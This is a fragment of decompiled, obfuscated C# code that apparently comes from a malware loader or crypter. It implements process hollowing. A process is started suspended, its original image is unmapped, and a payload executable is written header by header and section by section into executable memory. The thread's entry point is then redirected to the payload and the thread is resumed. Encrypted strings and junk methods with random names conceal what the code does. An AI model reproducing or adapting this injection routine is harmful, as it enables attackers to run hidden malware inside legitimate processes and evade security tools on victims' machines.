			Class5.Class6.Delegate8 delegate9 = Class5.Class6.smethod_0<Class5.Class6.Delegate8>(Class14.smethod_0(4877), string_5);
			Class5.Class6.Delegate9 delegate10 = Class5.Class6.smethod_0<Class5.Class6.Delegate9>(Class14.smethod_0(4877), string_2);
			try
			{
				if (!string.IsNullOrEmpty(string_1))
				{
					text = text + Class14.smethod_0(1175) + string_1;
				}
				if (!delegate6(string_0, text, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(byte_0, 60);
				int num2 = BitConverter.ToInt32(byte_0, num + 52);
				int[] array = new int[179];
				array[0] = 65538;
				if (IntPtr.Size == 4)
				{
					if (!delegate5(processInformation.intptr_1, array))
					{
						throw new Exception();
					}
				}
				else if (!delegate2(processInformation.intptr_1, array))
				{
					throw new Exception();
				}
				int num3 = array[41];
				int buffer = default(int);
				int bytesRead = default(int);
				if (!delegate3(processInformation.intptr_0, num3 + 8, ref buffer, 4, ref bytesRead))
				{
					throw new Exception();
				}
				if (num2 == buffer && delegate4(processInformation.intptr_0, buffer) != 0)
				{
					throw new Exception();
				}
				int num4 = BitConverter.ToInt32(byte_0, num + 80);
				int bufferSize = BitConverter.ToInt32(byte_0, num + 84);
				int num5 = (int)delegate8(processInformation.intptr_0, num2, (uint)num4, 12288u, 64u);
				bool flag = default(bool);
				if (!bool_0 && num5 == 0)
				{
					flag = true;
					num5 = (int)delegate8(processInformation.intptr_0, 0, (uint)num4, 12288u, 64u);
				}
				if (num5 == 0)
				{
					throw new Exception();
				}
				if (!delegate10(processInformation.intptr_0, num5, byte_0, bufferSize, ref bytesRead))
				{
					throw new Exception();
				}
				int num6 = num + 248;
				short num7 = BitConverter.ToInt16(byte_0, num + 6);
				int num8 = num7 - 1;
				for (int i = 0; i <= num8; i++)
				{
					int num9 = BitConverter.ToInt32(byte_0, num6 + 12);
					int num10 = BitConverter.ToInt32(byte_0, num6 + 16);
					int srcOffset = BitConverter.ToInt32(byte_0, num6 + 20);
					if (num10 != 0)
					{
						byte[] array2 = new byte[num10 - 1 + 1];
						Buffer.BlockCopy(byte_0, srcOffset, array2, 0, array2.Length);
						if (!delegate10(processInformation.intptr_0, num5 + num9, array2, array2.Length, ref bytesRead))
						{
							throw new Exception();
						}
					}
					num6 += 40;
				}
				byte[] bytes = BitConverter.GetBytes(num5);
				if (!delegate10(processInformation.intptr_0, num3 + 8, bytes, 4, ref bytesRead))
				{
					throw new Exception();
				}
				int num11 = BitConverter.ToInt32(byte_0, num + 40);
				if (flag)
				{
					num5 = num2;
				}
				array[44] = num5 + num11;
				if (IntPtr.Size == 4)
				{
					if (!delegate9(processInformation.intptr_1, array))
					{
						throw new Exception();
					}
				}
				else if (!@delegate(processInformation.intptr_1, array))
				{
					throw new Exception();
				}
				Thread.Sleep(300);
				delegate7(processInformation.intptr_1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Process processById = Process.GetProcessById((int)processInformation.uint_0);
				Conversion.Int((object)false);
				processById?.Kill();
				Conversion.Int((object)false);
				result = false;
				ProjectData.ClearProjectError();
				goto IL_0494;
			}
			return true;
		}
		IL_0494:
		return result;
	}

	static Type smethod_159(Class34 class34_0)
	{
		return class34_0.type_0;
	}

	internal static bool aoKmv57A4wSEkvDOgia()
	{
		return true;
	}

	internal static bool XdRJXa7sy9ebEBASZRt()
	{
		return false;
	}
}
